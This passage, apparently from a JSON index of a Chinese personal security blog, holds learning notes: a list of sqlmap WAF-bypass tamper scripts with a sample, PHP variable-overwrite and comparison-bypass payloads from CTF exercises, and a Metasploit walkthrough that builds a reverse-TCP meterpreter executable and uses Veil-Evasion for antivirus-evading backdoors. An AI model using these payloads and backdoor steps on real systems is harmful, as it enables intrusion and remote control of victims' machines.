用非法双字节unicode字符替换单引号字符</span><br><span class=\"line\">appendnullbyte.py 在payload末尾添加空字符编码</span><br><span class=\"line\">base64encode.py 对给定的payload全部字符使用Base64编码</span><br><span class=\"line\">between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</span><br><span class=\"line\">bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</span><br><span class=\"line\">chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</span><br><span class=\"line\">charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</span><br><span class=\"line\">charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</span><br><span class=\"line\">concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</span><br><span class=\"line\">equaltolike.py  用“LIKE”运算符替换全部等于号“=”</span><br><span class=\"line\">greatest.py  用“GREATEST”函数替换大于号“&gt;”</span><br><span class=\"line\">halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</span><br><span class=\"line\">ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</span><br><span class=\"line\">lowercase.py 用小写值替换每个关键字字符</span><br><span class=\"line\">modsecurityversioned.py 用注释包围完整的查询</span><br><span class=\"line\">modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</span><br><span class=\"line\">multiplespaces.py 在SQL关键字周围添加多个空格</span><br><span class=\"line\">nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</span><br><span class=\"line\">overlongutf8.py 转换给定的payload当中的所有字符</span><br><span class=\"line\">percentage.py 在每个字符之前添加一个百分号</span><br><span class=\"line\">randomcase.py 随机转换每个关键字字符的大小写</span><br><span class=\"line\">randomcomments.py 向SQL关键字中插入随机注释</span><br><span class=\"line\">securesphere.py 添加经过特殊构造的字符串</span><br><span class=\"line\">sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs</span><br><span class=\"line\">space2comment.py 用“/**/”替换空格符</span><br><span class=\"line\">space2dash.py 用破折号注释符“--”其次是一个随机字符串和一个换行符替换空格符</span><br><span class=\"line\">space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</span><br><span class=\"line\">space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</span><br><span class=\"line\">space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class=\"line\">space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符</span><br><span class=\"line\">space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class=\"line\">space2mysqldash.py 用破折号注释符“--”其次是一个换行符替换空格符</span><br><span class=\"line\">space2plus.py 用加号“+”替换空格符</span><br><span class=\"line\">space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class=\"line\">unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”</span><br><span class=\"line\">unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</span><br><span class=\"line\">varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF</span><br><span class=\"line\">versionedkeywords.py 用MySQL注释包围每个非函数关键字</span><br><span class=\"line\">versionedmorekeywords.py 用MySQL注释包围每个关键字</span><br><span class=\"line\">xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</span><br></pre></td></tr></table></figure>\n<h2 id=\"tamper的简单编写：\"><a href=\"#tamper的简单编写：\" class=\"headerlink\" title=\"tamper的简单编写：\"></a>tamper的简单编写：</h2><p>栗子：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># sqlmap/tamper/yourtamper.py</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> lib.core.enums <span class=\"keyword\">import</span> PRIORITY</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#定义脚本的优先级，用于有多个tamper脚本的情况</span></span><br><span class=\"line\">__priority__ = PRIORITY.LOWEST </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#声明该脚本适用/不适用的范围，可以为空</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dependencies</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">pass</span> </span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"comment\">#主要函数，接受的参数为payload和**kwargs返回值为替换后的payload</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">tamper</span><span class=\"params\">(payload, **kwargs)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> payload.replace(<span class=\"string\">\".\"</span>, <span class=\"string\">\"\\\\.\"</span>)</span><br></pre></td></tr></table></figure></p>\n","categories":[],"tags":["web安全"]},{"title":"php变量覆盖的学习","url":"http://b1ng0.top/2017/03/14/php变量覆盖的学习/","content":"<h1 id=\"关于php变量覆盖漏洞：\"><a href=\"#关于php变量覆盖漏洞：\" class=\"headerlink\" title=\"关于php变量覆盖漏洞：\"></a>关于php变量覆盖漏洞：</h1><p>关注函数：extract(),parse_str(),$$,import_request_varables(),etc.</p>\n<h2 id=\"extract\"><a href=\"#extract\" class=\"headerlink\" title=\"extract():\"></a>extract():</h2><p>栗子:<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">$a = <span class=\"number\">2333</span>;</span><br><span class=\"line\">@extract($_GET);</span><br><span class=\"line\">print_r($a);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>payload:<br><code>?a=1//即可覆盖$a</code></p>\n<h2 id=\"parse-str\"><a href=\"#parse-str\" class=\"headerlink\" title=\"parse_str():\"></a>parse_str():</h2><p>栗子:<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$a=<span class=\"number\">2333</span>;</span><br><span class=\"line\">parse_str($_SERVER[<span class=\"string\">'QUERY_STRING'</span>]);</span><br><span class=\"line\"><span class=\"keyword\">print</span> $a;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>payload:<br><code>?a=1//即可覆盖$a</code></p>\n<h2 id><a href=\"#\" class=\"headerlink\" title=\"$$:\"></a>$$:</h2><p>栗子:<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">$a = <span class=\"number\">2333</span>;</span><br><span class=\"line\"><span class=\"keyword\">foreach</span>(<span class=\"keyword\">array</span>(<span class=\"string\">'_COOKIE'</span>,<span class=\"string\">'_POST'</span>,<span class=\"string\">'_GET'</span>) <span class=\"keyword\">as</span> $_request)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">foreach</span>($$_request <span class=\"keyword\">as</span> $_key=&gt;$_value)&#123;</span><br><span class=\"line\">\t\t$$_key = addslashes($_value);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">print_r($a)</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>payload:<br><code>?a=1//即可覆盖$a</code></p>\n","categories":[],"tags":["php"]},{"title":"关于php比较运算符","url":"http://b1ng0.top/2017/02/28/关于php比较运算符/","content":"<h1 id=\"比较运算符”-”与”-”的学习：\"><a href=\"#比较运算符”-”与”-”的学习：\" class=\"headerlink\" title=\"比较运算符”==”与”===”的学习：\"></a>比较运算符”==”与”===”的学习：</h1><h2 id=\"关于”-”的绕过：\"><a href=\"#关于”-”的绕过：\" class=\"headerlink\" title=\"关于”==”的绕过：\"></a>关于”==”的绕过：</h2><p>0e开头的全部相等<br>栗子:<br><code>md5(&#39;240610708&#39;) == md5(&#39;QNKCDZO&#39;)</code><br><code>md5(&#39;aabg7XSs&#39;) == md5(&#39;aabC9RqS&#39;)</code><br><code>sha1(&#39;aaroZmOk&#39;) == sha1(&#39;aaK1STfY&#39;)</code><br><code>sha1(&#39;aaO8zKZF&#39;) == sha1(&#39;aa3OFF9m&#39;)</code><br><code>&#39;0010e2&#39; == &#39;1e3&#39;</code><br><code>&#39;0x1234Ab&#39; == &#39;1193131&#39;</code><br><code>&#39;0xABCdef&#39; == &#39;     0xABCdef&#39;</code><br>一道简单的CTF题目：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$key = <span class=\"string\">\"llocdpocuzion5dcp2bindhspiccy\"</span>;</span><br><span class=\"line\">$flag = strcmp($key, $_GET[<span class=\"string\">'key'</span>]);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($flag == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"Welcome!\"</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"Bad key!\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>payload:<br><code>?key[]=1</code></p>\n<p>var_dump(strcmp( ‘’, array())) =&gt; NULL ⇒ NULL == 0 ⇒ Get Flag！</p>\n<h2 id=\"关于“-”的绕过：\"><a href=\"#关于“-”的绕过：\" class=\"headerlink\" title=\"关于“===”的绕过：\"></a>关于“===”的绕过：</h2><p>利用数组绕过</p>\n<p>一道简单的CTF题目：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'name'</span>]) <span class=\"keyword\">and</span> <span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'password'</span>])) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ($_GET[<span class=\"string\">'name'</span>] == $_GET[<span class=\"string\">'password'</span>])</span><br><span class=\"line\">\t\t<span class=\"keyword\">print</span> <span class=\"string\">'Your password can not be your name.'</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (sha1($_GET[<span class=\"string\">'name'</span>]) === sha1($_GET[<span class=\"string\">'password'</span>]))</span><br><span class=\"line\">\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Flag: '</span>.$flag);</span><br></pre></td></tr></table></figure></p>\n<p>payload:<br><code>?name[]=1&amp;password[]=2</code></p>\n","categories":[],"tags":["php"]},{"title":"metasploit 初体验","url":"http://b1ng0.top/2017/02/06/metasploit初体验/","content":"<h1 id=\"msf简单使用：-以windows-meterpreter-reverse-tcp为例\"><a href=\"#msf简单使用：-以windows-meterpreter-reverse-tcp为例\" class=\"headerlink\" title=\"msf简单使用：(以windows/meterpreter/reverse_tcp为例)\"></a>msf简单使用：(以windows/meterpreter/reverse_tcp为例)</h1><h2 id=\"1-payload设置：\"><a href=\"#1-payload设置：\" class=\"headerlink\" title=\"1.payload设置：\"></a>1.payload设置：</h2><p>新开终端<br><code>msfvenom -l</code><br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件</code></p>\n<h2 id=\"2-监听：\"><a href=\"#2-监听：\" class=\"headerlink\" title=\"2.监听：\"></a>2.监听：</h2><p>进入metasploit<br><code>use exploit/multi/handler</code><br><code>show options</code></p>\n<h2 id=\"3-插入攻击荷载\"><a href=\"#3-插入攻击荷载\" class=\"headerlink\" title=\"3.插入攻击荷载\"></a>3.插入攻击荷载</h2><p>show payloads<br><code>set payload windows/meterpreter_reverse_tcp</code><br>再次show options(出现LHOST和LPORT选项)<br><code>set lhost 192.168.1.120</code><br><code>set lport 4444</code></p>\n<h2 id=\"4-使用run-或者-exploit-启动攻击\"><a href=\"#4-使用run-或者-exploit-启动攻击\" class=\"headerlink\" title=\"4.使用run 或者 exploit 启动攻击\"></a>4.使用run 或者 exploit 启动攻击</h2><p>等待被攻击主机中招，即可拿到session<br>使用jobs停止攻击<br><code>sessions -l  //获取session列表</code><br><code>sessions -i 1 //进入meterpreter</code></p>\n<p>==============================</p>\n<h1 id=\"PS\"><a href=\"#PS\" class=\"headerlink\" title=\"PS:\"></a>PS:</h1><h2 id=\"使用veil-veasion生成后门：\"><a href=\"#使用veil-veasion生成后门：\" class=\"headerlink\" title=\"使用veil-veasion生成后门：\"></a>使用veil-veasion生成后门：</h2><p>打开终端<br><code>veil-veasion</code><br><code>list</code><br><code>use 6 //以c为例</code></p>\n<p>生成的后台地址：<br><code>/var/lib/veil-evasion/output/compiled/payload.exe</code></p>\n<p>在msf中使用：<br><code>msfconsole -r /var/lib/veil-evasion/output/handlers/payload_handler.rc</code></p>\n","categories":[],"tags":["metasploit"]},{"title":"Hello World","url":"http://b1ng0.top/2017/01/14/hello world/","content":"<p>寒假宅在家里无聊搭了这个博客,以后有空会在上面分享一些东西吧。</p>\n<p>随便写写说的好像有人会来看的样子。。。</p>\n","categories":[],"tags":[]},{"title":"about","url":"http://b1ng0.top/about/index.html","content":"<p>Cdut &amp; Cqupt, 1996, Summer.<br>左手coding, 右手hacking. 是代码菜鸡, 也是脚本小子.<br>剑未配妥, 出门已是江湖…</p>\n<p>Hacktivity:</p>\n<p><a href=\"https://www.cnvd.org.cn/flaw/show/1857497\" target=\"_blank\" rel=\"noopener\">CNVD-2020-00202</a></p>\n<p><a href=\"https://www.cnvd.org.cn/flaw/show/1868587\" target=\"_blank\" rel=\"noopener\">CNVD-2019-47188</a></p>\n<p><a href=\"https://www.cnvd.org.cn/flaw/show/1837475\" target=\"_blank\" rel=\"noopener\">CNVD-2019-44154</a></p>\n<p><a href=\"https://www.cnvd.org.cn/flaw/show/1380685\" target=\"_blank\" rel=\"noopener\">CNVD-2018-17471</a></p>\n<p><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10073\" target=\"_blank\" rel=\"noopener\">CVE-2018-10073</a></p>\n","categories":[],"tags":[]},{"title":"category","url":"http://b1ng0.top/category/index.html","content":"","categories":[],"tags":[]},{"title":"link","url":"http://b1ng0.top/link/index.html","content":"","categories":[],"tags":[]},{"title":"project","url":"http://b1ng0.top/project/index.html","content":"","categories":[],"tags":[]},{"title":"search","url":"http://b1ng0.top/search/index.html","content":"","categories":[],"tags":[]},{"title":"tag","url":"http://b1ng0.top/tag/index.html","content":"","categories":[],"tags":[]}]